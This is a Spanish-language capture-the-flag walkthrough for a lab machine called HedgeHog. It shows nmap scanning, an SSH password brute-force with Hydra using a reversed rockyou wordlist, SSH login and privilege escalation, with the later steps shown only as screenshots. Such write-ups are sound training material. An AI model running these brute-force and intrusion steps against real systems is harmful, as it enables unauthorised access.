---
description: >-
  ✍️ Autor: AnkbNikas  🔍 Dificultad: Muy Fácil  📅 Fecha de creación:
  10/11/2024
---

# HedgeHog

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (765).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web que nos muestra un posible usuario llamado **tails**.

<figure><img src="../../.gitbook/assets/image (767).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **172.17.0.2**. Observamos que tarda demasiado por lo que debe ser de las últimas contraseñas del diccionario por lo que realizamos los siguientes comandos.\
Volteamos el diccionario.

```bash
tac /usr/share/wordlists/rockyou.txt > diccionario
```

Quitamos espacios.

```bash
cat diccionario | sed 's/ //g' > rockyou
```

Realizamos el ataque de fuerza bruta con **Hydra** con ese diccionario creado.

<figure><img src="../../.gitbook/assets/image (768).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **tails**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh tails@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (772).png" alt=""><figcaption></figcaption></figure>

Ahora somos el usuario **Sonic**.

<figure><img src="../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>

Escalamos privilegios a **root**.&#x20;

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-11-15 a las 16.56.12.png" alt=""><figcaption></figcaption></figure>
